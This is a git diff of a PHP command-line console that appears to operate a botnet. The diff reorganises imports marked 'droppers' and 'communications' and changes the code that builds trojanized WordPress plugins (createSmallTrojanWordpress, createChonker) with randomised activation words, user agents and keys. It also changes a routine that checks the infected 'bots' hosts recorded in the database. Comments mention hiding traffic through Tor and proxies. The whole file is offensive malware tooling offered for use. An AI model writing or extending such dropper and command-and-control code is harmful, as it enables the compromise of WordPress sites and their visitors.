@@ -1,15 +1,30 @@
 <?php
 require_once "lib/classes.php";
 
-use userAgents\agentsList;
-use curlStuff\mainCurl;
-use proxyWorks\confirmProxy;
+//pipe dream.
 use fake_the_landing\randomDefaultPage;
+//end pipe dream.
+
+// communications
+use curlStuff\validateMeMore\talkToMeDamnit;
+use curlStuff\mainCurl;
+use userAgents\agentsList;
+use proxyWorks\confirmProxy;
+//end communications
+
+// might remove this, since tor is what should be used.
 use proxies\populateRandomProxies;
+// end stuff.
+
+// droppers
 use new_bots\makeMeSlim\slimDropper;
 use new_bots\wordpressPlugins\makeMeWordPressing;
+// end droppers
+
+//graphics and shit
 use logos\art\artisticStuff;
 use logos\menus\mainMenu;
+//end graphipcs and shit.
 
 $d = default_config;
 $configs = $d->exportConfigConstants();
@@ -60,7 +75,7 @@ while (true){
                     if (is_null($act_word) or $act_word === ""){
                         $act_word = bin2hex(openssl_random_pseudo_bytes(24));
                     }
-                    $trj = new makeMeWordPressing($act_word);
+                    $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                     $a = $trj->createSmallTrojanWordpress();
                     $database->insertData([
                             "action" => "add_press",
@@ -74,7 +89,7 @@ while (true){
                     if (is_null($act_word) or $act_word === ""){
                         $act_word = bin2hex(openssl_random_pseudo_bytes(24));
                     }
-                    $trj = new makeMeWordPressing($act_word);
+                    $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                     $yay = $trj->createChonker();
                     $database->insertData([
                         "action" => "add_press",
@@ -99,8 +114,11 @@ while (true){
             break;
         case str_starts_with($c, "ch") !== false:
             $m->validateHost();
-            foreach ($database->grabOrFormatOutput(['type' => 'all_bots']) as $grabbedData => $item){
-                $validation = new \curlStuff\validateMeMore\talkToMeDamnit();
+            $validateMeMore = new talkToMeDamnit();
+            try {
+                $validateMeMore->checkMultiHost($database->grabOrFormatOutput(['type' => 'all_bots'])["bots"]);
+            } catch (Exception $e) {
+                echo $e.PHP_EOL;
             }
             break;
         case str_starts_with($c, "at") !== false:
@@ -119,7 +137,8 @@ while (true){
             $m->generateCertMenu();
             break;
         case str_starts_with($c, "o") !== false:
-            var_dump($configs);
+            echo "Current Options: ".PHP_EOL;
+            print_r($configs);
             readline("Press enter to continue.");
             break;
         case str_starts_with($c, "ac") !== false:
